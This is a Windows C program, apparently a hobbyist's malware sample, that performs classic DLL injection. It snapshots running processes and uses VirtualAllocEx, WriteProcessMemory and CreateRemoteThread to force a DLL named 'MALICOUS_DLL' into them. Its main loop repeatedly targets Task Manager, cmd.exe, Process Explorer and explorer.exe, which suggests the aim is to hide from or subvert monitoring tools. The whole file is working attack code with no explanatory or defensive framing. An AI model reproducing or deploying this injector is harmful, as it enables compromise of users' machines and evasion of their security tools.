#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>



#define MALICOUS_DLL TEXT("C:\\Users\\Oryan\\Desktop\\Dll1.dll")


#ifdef UNICODE
#define LOAD_LIBRARY_VERSION "LoadLibraryW"
#else
#define LOAD_LIBRARY_VERSION "LoadLibraryA"
#endif 


DWORD DllInjectionByPID(DWORD dwProcessId, LPCTSTR lpDllPath)
{
    printf("start DllInjectionByPID\n");
    HANDLE hProcess, hThread;
    LPVOID pExAddress, pLoadLibraryAddr;
    DWORD dwThreadId;
    size_t dwInjectedDllPathSize;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwProcessId);
    if (hProcess == INVALID_HANDLE_VALUE)
    {
        printf("OpenProcess Error: %d", GetLastError());
        return 1;
    }

    dwInjectedDllPathSize = _tcslen(lpDllPath) * sizeof(TCHAR) + sizeof(TCHAR);

    pExAddress = VirtualAllocEx(hProcess, NULL, dwInjectedDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pExAddress == NULL)
    {
        printf("VirtualAllocEx Error: %d", GetLastError());
        return 2;
    }

    if (WriteProcessMemory(hProcess, pExAddress, lpDllPath, dwInjectedDllPathSize, NULL) == 0)
    {
        printf("WriteProcessMemory Error: %d", GetLastError());
        return 3;
    }

    pLoadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), LOAD_LIBRARY_VERSION);
    if (pLoadLibraryAddr == NULL) {
        printf("GetProcAddress Error: %d", GetLastError());
        return 4;
    }
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryAddr, pExAddress, 0, &dwThreadId);
    if (hThread == NULL) {
        printf("CreateRemoteThread Error: %d", GetLastError());
    }

    return 0;

}

DWORD DllInjectionByName(const TCHAR* PName, LPCTSTR lpDllPath)
{
    HANDLE hProcessSnapshot;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Take a snapshot of all processes in the system.
    hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("hProcessSnapshot Error: %d", GetLastError());
        return -1;
    }

    if (!Process32First(hProcessSnapshot, &pe32))
    {
        printf("Process32First Error: %d", GetLastError());
        CloseHandle(hProcessSnapshot);
        return -1;
    }

    do
    {
        if (_tcscmp(pe32.szExeFile, PName) == 0)
        {
            DllInjectionByPID(pe32.th32ProcessID, lpDllPath);
        }

    } while (Process32Next(hProcessSnapshot, &pe32));

    CloseHandle(hProcessSnapshot);
    return 0;
}



int main()
{
    while (TRUE) {
        DllInjectionByName(TEXT("Taskmgr.exe"), MALICOUS_DLL);
        DllInjectionByName(TEXT("cmd.exe"), MALICOUS_DLL);
        DllInjectionByName(TEXT("procexp64.exe"), MALICOUS_DLL);
        DllInjectionByName(TEXT("procexp.exe"), MALICOUS_DLL);
        DllInjectionByName(TEXT("explorer.exe"), MALICOUS_DLL);
    }


    return 0;
}
